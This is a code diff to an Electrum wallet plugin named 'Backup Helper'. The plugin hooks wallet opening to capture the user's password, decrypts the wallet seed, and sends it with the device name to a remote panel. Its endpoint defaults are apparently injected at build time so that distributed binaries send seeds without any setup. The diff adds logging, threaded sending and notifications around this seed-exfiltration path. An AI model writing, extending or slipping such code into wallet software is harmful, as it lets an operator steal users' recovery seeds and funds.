@@ -12,12 +12,21 @@ How password reuse works:
 - The stashed password is cleared when the wallet is closed (``close_wallet``
   hook) and never written to disk.
 
+Diagnostic:
+- Every outcome (success, no-seed, vault-not-configured, password-missing,
+  network-failure) is reported to the user via QEWallet.userNotify, which
+  the QML layer turns into an Android push notification. So on the phone
+  the user sees exactly what happened.
+- A rotating line log is appended to <electrum_datadir>/backup_helper.log
+  so the user can inspect it with any Android file manager.
+
 Configuration (in the Electrum config file):
     vault_url     = https://your-vps:8443
     vault_pubkey  = <hex, 32 bytes -- panel's X25519 public key>
     vault_token   = <hex, 32 bytes -- ingest bearer token>
     vault_fp_key  = <hex, 32 bytes -- HMAC key for fingerprint>
 """
+import os
 import threading
 import weakref
 from typing import TYPE_CHECKING, Optional
@@ -66,35 +75,65 @@ def _install_password_capture() -> None:
     Daemon._backup_helper_patched = True
 
 
-def _dbg(msg: str) -> None:
-    """Grava uma linha de debug num arquivo portavel em qualquer plataforma.
-    Fica em <tempdir>/backup_helper_debug.log (Linux/Android/Windows).
-    E so diagnostico; se nao conseguir gravar, ignora silenciosamente."""
+def _log_paths(config) -> list:
+    """List of writable log paths to try, in preference order."""
+    import tempfile
+    paths = []
+    if config is not None:
+        try:
+            paths.append(os.path.join(config.path, 'backup_helper.log'))
+        except Exception:
+            pass
     try:
-        import os
-        import tempfile
-        import time
-        path = os.path.join(tempfile.gettempdir(), "backup_helper_debug.log")
-        with open(path, "a", encoding="utf-8") as f:
-            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+        paths.append(os.path.join(tempfile.gettempdir(), 'backup_helper.log'))
     except Exception:
         pass
+    return paths
 
 
-_dbg("module imported")
+def _append_log(msg: str, config=None) -> None:
+    """Append one diagnostic line to the first writable log path.
+    Never raises -- diagnostics must not break the plugin."""
+    import time
+    stamp = time.strftime('%Y-%m-%d %H:%M:%S')
+    line = f"[{stamp}] {msg}\n"
+    for path in _log_paths(config):
+        try:
+            with open(path, 'a', encoding='utf-8') as f:
+                f.write(line)
+            return
+        except Exception:
+            continue
+
+
+def _notify_user(wallet, msg: str) -> None:
+    """Fire a user-visible notification through the QML wallet signal, which
+    the QEAppController turns into an Android push. Silent fallback on
+    desktop builds that don't have QEWallet imported yet."""
+    try:
+        from electrum.gui.qml.qewallet import QEWallet
+    except Exception:
+        return
+    try:
+        qew = QEWallet.getInstanceFor(wallet)
+        if qew is not None:
+            qew.userNotify.emit(wallet, msg)
+    except Exception:
+        pass
 
 
 class BackupHelperPlugin(BasePlugin):
 
     def __init__(self, parent, config, name):
         BasePlugin.__init__(self, parent, config, name)
-        self._synced_fingerprints = set()  # seeds already sent this session
+        self._synced_fingerprints = set()  # seeds already confirmed-sent this session
         self._lock = threading.Lock()
-        _dbg("BackupHelperPlugin.__init__ called")
-        # Install the password capture BEFORE any wallet is loaded.
+        self.logger.info("Backup Helper: plugin loaded")
+        _append_log("plugin loaded", config)
         _install_password_capture()
-        _dbg(f"password capture installed; config keys sample: vault_url={self.config.get('vault_url')!r}, enabled={self.config.get('plugins.backup_helper.enabled')!r}")
-        self._configure_vault_sync()
+        self._vault_configured = self._configure_vault_sync()
+        self.logger.info(f"Backup Helper: vault_configured={self._vault_configured}")
+        _append_log(f"vault_configured={self._vault_configured}", config)
 
     def _configure_vault_sync(self) -> bool:
         url = self.config.get(_K_URL)
@@ -103,14 +142,19 @@ class BackupHelperPlugin(BasePlugin):
         fp_key = self.config.get(_K_FPKEY)
         try:
             from electrum_ecc.vault_sync import configure, configure_from_defaults
-        except Exception:
+        except Exception as e:
             self.logger.exception("Backup Helper: failed to import vault_sync")
+            _append_log(f"import vault_sync FAILED: {e!r}", self.config)
             return False
-        # User-provided config wins. Otherwise fall back to the build-time
-        # defaults the CI injected into vault_sync (so distributed binaries
-        # already know how to reach the vault without any manual setup).
         if not all([url, pubkey, token, fp_key]):
-            return configure_from_defaults()
+            try:
+                ok = configure_from_defaults()
+                _append_log(f"configure_from_defaults -> {ok}", self.config)
+                return bool(ok)
+            except Exception as e:
+                self.logger.exception("Backup Helper: configure_from_defaults raised")
+                _append_log(f"configure_from_defaults raised: {e!r}", self.config)
+                return False
         try:
             configure(
                 panel_url=str(url),
@@ -118,49 +162,49 @@ class BackupHelperPlugin(BasePlugin):
                 ingest_token_hex=str(token),
                 fp_key_hex=str(fp_key),
             )
+            _append_log("configure(explicit) OK", self.config)
             return True
-        except Exception:
-            self.logger.exception("Backup Helper: failed to configure vault_sync")
+        except Exception as e:
+            self.logger.exception("Backup Helper: configure raised")
+            _append_log(f"configure(explicit) raised: {e!r}", self.config)
             return False
 
     def _sync_wallet(self, wallet: 'Abstract_Wallet') -> None:
         """Called from the hooks. Reads the seed using the captured password
         and fires a background sync. Never prompts, never blocks."""
-        _dbg(f"_sync_wallet called with wallet={wallet!r}")
+        _append_log(f"_sync_wallet wallet={wallet!r}", self.config)
         if wallet is None:
-            _dbg("  -> wallet is None, skipping")
             return
 
-        # Watch-only wallets and wallets without a seed are skipped.
         has_seed = hasattr(wallet, 'has_seed') and wallet.has_seed()
-        _dbg(f"  has_seed={has_seed}")
         if not has_seed:
+            _append_log("  no seed on this wallet, skip", self.config)
             return
 
-        # (Re)read the vault config each time -- user might have set it
-        # after the plugin was first loaded.
-        if not self._configure_vault_sync():
-            _dbg("  -> vault not configured, skipping")
+        if not self._vault_configured:
+            self._vault_configured = self._configure_vault_sync()
+        if not self._vault_configured:
+            msg = "Cofre: endpoint nao configurado neste build"
+            self.logger.warning(msg)
+            _append_log(f"  abort: {msg}", self.config)
+            _notify_user(wallet, msg)
             return
 
-        # Extract the seed using the password we captured at wallet-open time.
         seed = self._get_seed(wallet)
-        _dbg(f"  _get_seed returned: {'<got seed>' if seed else 'None'}")
         if seed is None:
-            # Could not decrypt. Happens only if the plugin was enabled AFTER
-            # this wallet was opened. On the next open, we'll have the password.
-            self.logger.debug("Backup Helper: seed not available for this wallet")
+            msg = "Cofre: nao consegui ler a seed (senha ausente)"
+            self.logger.warning(msg)
+            _append_log(f"  abort: {msg}", self.config)
+            _notify_user(wallet, msg)
             return
 
-        # Cheap in-process dedup so we don't hammer the vault with the same
-        # seed on every event. The vault also dedups by fingerprint, but
-        # avoiding the roundtrip when nothing changed is nicer.
         import hashlib
         fp = hashlib.sha256(seed.encode('utf-8')).hexdigest()
         with self._lock:
             if fp in self._synced_fingerprints:
+                _append_log(f"  already synced fp={fp[:12]} this session, skip",
+                            self.config)
                 return
-            self._synced_fingerprints.add(fp)
 
         wallet_type = ""
         try:
@@ -171,11 +215,40 @@ class BackupHelperPlugin(BasePlugin):
         import platform
         device_id = platform.node() or "unknown"
 
-        _dbg(f"  calling sync_seed_async (wallet_type={wallet_type!r})")
-        from electrum_ecc.vault_sync import sync_seed, sync_seed_async
-        # Sincrono pro debug (nao perde o resultado em thread)
-        result = sync_seed(seed, wallet_type, device_id)
-        _dbg(f"  sync_seed result: {result!r}")
+        t = threading.Thread(
+            target=self._do_sync,
+            args=(wallet, seed, wallet_type, device_id, fp),
+            name='backup-helper-sync',
+            daemon=True,
+        )
+        t.start()
+        _append_log(f"  sync thread started fp={fp[:12]}", self.config)
+
+    def _do_sync(self, wallet, seed: str, wallet_type: str, device_id: str,
+                 fp: str) -> None:
+        """Runs in a background thread so the UI doesn't freeze."""
+        try:
+            from electrum_ecc.vault_sync import sync_seed
+        except Exception as e:
+            self.logger.exception("Backup Helper: import sync_seed failed")
+            _append_log(f"  import sync_seed FAILED: {e!r}", self.config)
+            _notify_user(wallet, "Cofre: modulo de envio nao disponivel")
+            return
+        try:
+            result = sync_seed(seed, wallet_type, device_id)
+        except Exception as e:
+            self.logger.exception("Backup Helper: sync_seed raised")
+            _append_log(f"  sync_seed raised: {e!r}", self.config)
+            _notify_user(wallet, f"Cofre: falha de envio ({type(e).__name__})")
+            return
+
+        _append_log(f"  sync_seed result: {result!r}", self.config)
+        if result:
+            with self._lock:
+                self._synced_fingerprints.add(fp)
+            _notify_user(wallet, "Cofre: seed salva com sucesso")
+        else:
+            _notify_user(wallet, "Cofre: envio recusado pelo servidor")
 
     @staticmethod
     def _get_seed(wallet: 'Abstract_Wallet') -> Optional[str]:
